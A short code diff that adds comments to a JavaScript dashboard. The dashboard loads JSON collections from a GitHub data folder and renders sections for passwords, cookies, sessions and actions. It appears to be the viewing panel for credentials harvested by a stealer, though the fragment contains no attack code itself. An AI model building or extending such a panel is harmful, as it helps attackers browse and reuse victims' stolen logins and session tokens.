@@ -37,6 +37,7 @@ async function fetchRawFile(downloadUrl) {
 // ============================================
 async function loadCollections() {
   try {
+    // Get list of files in the data folder
     const files = await fetchGitHubContents(DATA_FOLDER);
     const jsonFiles = files.filter(f => f.name.endsWith(".json"));
 
@@ -50,6 +51,7 @@ async function loadCollections() {
       }
     }
 
+    // Sort by timestamp (oldest first, newest last)
     collections.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
     collectionsData = collections;
     updateDashboard();
@@ -100,6 +102,7 @@ function updateDashboard() {
   const allCookies = getAllCookies();
   const allSessions = getAllSessions();
 
+  // Overview
   document.getElementById("overview").innerHTML = `
     <div class="stats-grid">
       <div class="stat-card">
@@ -134,9 +137,13 @@ function updateDashboard() {
     ` : ""}
   `;
 
+  // Passwords
   document.getElementById("passwords").innerHTML = renderPasswords(allPasswords);
+  // Cookies
   document.getElementById("cookies").innerHTML = renderCookies(allCookies);
+  // Sessions
   document.getElementById("sessions").innerHTML = renderSessions(allSessions);
+  // Actions
   document.getElementById("actions").innerHTML = renderActions();
 }
 
